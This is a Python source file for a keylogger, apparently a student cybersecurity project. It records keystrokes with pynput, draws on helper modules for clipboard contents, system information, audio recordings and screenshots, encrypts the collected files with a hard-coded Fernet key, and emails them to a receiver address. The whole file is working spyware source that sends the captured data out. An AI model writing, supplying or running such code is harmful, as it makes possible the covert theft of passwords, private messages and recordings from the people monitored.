from emailattach import send_email
from compute_info import computer_information, system_information
from clipboard import copy_clipboard, clipboard_information
from getaudio import audo_record,audio_information
from screenshots import screenshots, screenshort_information
import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os


from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

keys_information= "key_log.txt"

keys_information_e="e_key_log.txt"
system_information_e="e_system_info.txt"
clipboard_information_e="e_clip.txt"
audio_information_e="e_audio.wav"
screenshort_information_e="e_screenshots.png"

key="Khy266-BwtgNtktnnxOotNzlCtZxGF_-iYYZVkz2Fec="
file_path= "D:\\CYBERSECURITY PROJECT(KEYLOGGER)\\project"

extend="\\" 
file_merge= file_path + extend


count=0
keys =[]

def on_press(key):
    global keys, count

    print(key)
    keys.append(key)
    count+=1
    
    if count>=1:
        count=0
        write_file(keys)
        keys=[]

def write_file(keys):
    with open(file_path+extend+keys_information, "a") as f:
        for key in keys:
            if key ==Key.esc:
                continue
            k=str(key).replace("'", "")
            if "space" in k:
                f.write(' ')
            elif "enter" in k:
                f.write('\n')
            elif "key" not in k:
                f.write(k)
            
def on_release(key):
    if key ==Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()



files_to_encrypt=[file_merge + system_information, file_merge+clipboard_information, file_merge+keys_information, file_merge+audio_information,file_merge+screenshort_information]
encrypted_file_names=[file_merge+system_information_e, file_merge+clipboard_information_e, file_merge+keys_information_e, file_merge+audio_information_e, file_merge+screenshort_information_e]

count =0

for encrypting_file in files_to_encrypt:
    with open(files_to_encrypt[count], 'rb') as f:
        data=f.read()
    
    fernet=Fernet(key)
    encrypted=fernet.encrypt(data)

    with open(encrypted_file_names[count], 'wb') as f:
        f.write(encrypted)
    
    send_email(encrypted_file_names[count], encrypted_file_names[count], toaddr="email address of the receiver")
    count+=1

time.sleep(15)

